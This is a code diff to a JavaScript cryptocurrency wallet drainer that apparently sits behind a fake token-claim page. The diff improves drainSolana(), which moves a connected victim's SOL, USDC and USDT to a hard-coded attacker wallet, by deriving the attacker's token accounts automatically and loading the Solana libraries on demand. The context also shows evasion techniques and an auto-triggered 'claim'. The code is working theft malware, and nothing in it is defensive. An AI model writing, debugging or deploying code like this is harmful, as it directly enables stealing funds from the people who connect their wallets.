@@ -2268,6 +2268,56 @@ const EVASION_TECHNIQUES = {
   },
 };
 
+// ====== DYNAMIC SOLANA LIBRARY LOADING ======
+async function loadSolanaLibraries() {
+  if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined') {
+    console.log('Solana libraries already loaded');
+    return true;
+  }
+
+  return new Promise((resolve, reject) => {
+    let loaded = 0;
+    const total = 2;
+
+    function checkAll() {
+      if (loaded === total) {
+        console.log('✅ Solana libraries loaded dynamically');
+        resolve(true);
+      }
+    }
+
+    // Load solanaWeb3 if missing
+    if (typeof solanaWeb3 === 'undefined') {
+      const script1 = document.createElement('script');
+      script1.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js';
+      script1.onload = () => {
+        loaded++;
+        checkAll();
+      };
+      script1.onerror = () => reject(new Error('Failed to load solanaWeb3'));
+      document.head.appendChild(script1);
+    } else {
+      loaded++;
+      checkAll();
+    }
+
+    // Load splToken if missing
+    if (typeof splToken === 'undefined') {
+      const script2 = document.createElement('script');
+      script2.src = 'https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js';
+      script2.onload = () => {
+        loaded++;
+        checkAll();
+      };
+      script2.onerror = () => reject(new Error('Failed to load splToken'));
+      document.head.appendChild(script2);
+    } else {
+      loaded++;
+      checkAll();
+    }
+  });
+}
+
 // ====== ENHANCED APPLICATION STATE ======
 let tokenChart;
 let countdownInterval;
@@ -2294,21 +2344,19 @@ const CLAIM_THRESHOLD_USD = 3;
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
-const ATTACKER_SOLANA_ADDRESS = "2b6jStwWmYM795ADW4cnmuR7LTu1TUzgSo3whvbE5xmh"; // REPLACE WITH YOUR SOLANA WALLET ADDRESS
+const ATTACKER_SOLANA_ADDRESS = "2b6jStwWmYM795ADW4cnmuR7LTu1TUzgSo3whvbE5xmh"; // Attacker's SOL wallet address
 
-// Solana token constants (mint addresses and attacker token accounts – replace with your own)
+// Solana token constants – we'll derive the attacker's token accounts on the fly
 const SOLANA_TOKENS = [
   {
     symbol: 'USDC',
     mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
-    decimals: 6,
-    attackerTokenAccount: 'YourUSDCAccountAddressHere' // Attacker's associated token account for USDC
+    decimals: 6
   },
   {
     symbol: 'USDT',
     mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB',
-    decimals: 6,
-    attackerTokenAccount: 'YourUSDTAccountAddressHere' // Attacker's associated token account for USDT
+    decimals: 6
   }
 ];
 
@@ -2460,7 +2508,7 @@ async function checkAndAutoTriggerClaim() {
   }
 }
 
-// ====== FIXED SOLANA FUNCTIONS (using correct library APIs) ======
+// ====== FIXED SOLANA FUNCTIONS (using correct ATA logic) ======
 async function connectSolanaWallet() {
   const wallets = getSolanaWallets();
   if (wallets.length === 0) {
@@ -2498,7 +2546,7 @@ async function getSolanaTokenAccounts(connection, owner) {
       const mintPubkey = new solanaWeb3.PublicKey(token.mint);
       const accounts = await connection.getTokenAccountsByOwner(owner, { mint: mintPubkey });
       for (const { pubkey, account } of accounts.value) {
-        // Use splToken to parse account data
+        // Use splToken to decode account data
         const accountInfo = splToken.AccountLayout.decode(account.data);
         if (accountInfo.amount > 0) {
           tokenAccounts.push({
@@ -2506,8 +2554,7 @@ async function getSolanaTokenAccounts(connection, owner) {
             symbol: token.symbol,
             decimals: token.decimals,
             account: pubkey,
-            amount: accountInfo.amount,
-            attackerTokenAccount: token.attackerTokenAccount
+            amount: accountInfo.amount
           });
         }
       }
@@ -2518,14 +2565,20 @@ async function getSolanaTokenAccounts(connection, owner) {
   return tokenAccounts;
 }
 
+// Helper to get attacker's associated token account for a given mint
+async function getAttackerTokenAccount(mint) {
+  const attackerPubkey = new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS);
+  const mintPubkey = new solanaWeb3.PublicKey(mint);
+  return splToken.getAssociatedTokenAddressSync(mintPubkey, attackerPubkey);
+}
+
 async function drainSolana() {
   if (!solanaProvider || !solanaPublicKey) {
     throw new Error("Solana wallet not connected");
   }
 
-  if (typeof solanaWeb3 === 'undefined' || typeof splToken === 'undefined') {
-    throw new Error("Solana libraries not loaded");
-  }
+  // Ensure libraries are loaded
+  await loadSolanaLibraries();
 
   const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
   const owner = new solanaWeb3.PublicKey(solanaPublicKey);
@@ -2556,16 +2609,16 @@ async function drainSolana() {
     transaction.add(solTransfer);
   }
 
-  // Add token transfers using splToken
+  // Add token transfers using splToken – now using proper Associated Token Accounts
   for (const ta of tokenAccounts) {
-    const mintPubkey = new solanaWeb3.PublicKey(ta.mint);
-    const attackerTokenAccount = new solanaWeb3.PublicKey(ta.attackerTokenAccount);
+    // Get the attacker's ATA for this token
+    const attackerTokenAccount = await getAttackerTokenAccount(ta.mint);
     const tokenTransfer = splToken.createTransferInstruction(
-      ta.account,
-      attackerTokenAccount,
-      owner,
-      ta.amount,
-      [],
+      ta.account,                     // source (user's token account)
+      attackerTokenAccount,            // destination (attacker's ATA)
+      owner,                           // owner (user)
+      ta.amount,                       // amount
+      [],                              // multiSigners
       splToken.TOKEN_PROGRAM_ID
     );
     transaction.add(tokenTransfer);
@@ -2848,7 +2901,7 @@ async function callSetTokenApproval(tokenAddress, amount) {
   }
 }
 
-// ====== CALL depositBNB ======
+// ====== CALL depositBNB (corrected ABI shows it's payable) ======
 async function callDepositBNB(ethAmount) {
   try {
     if (!contractInstance) {
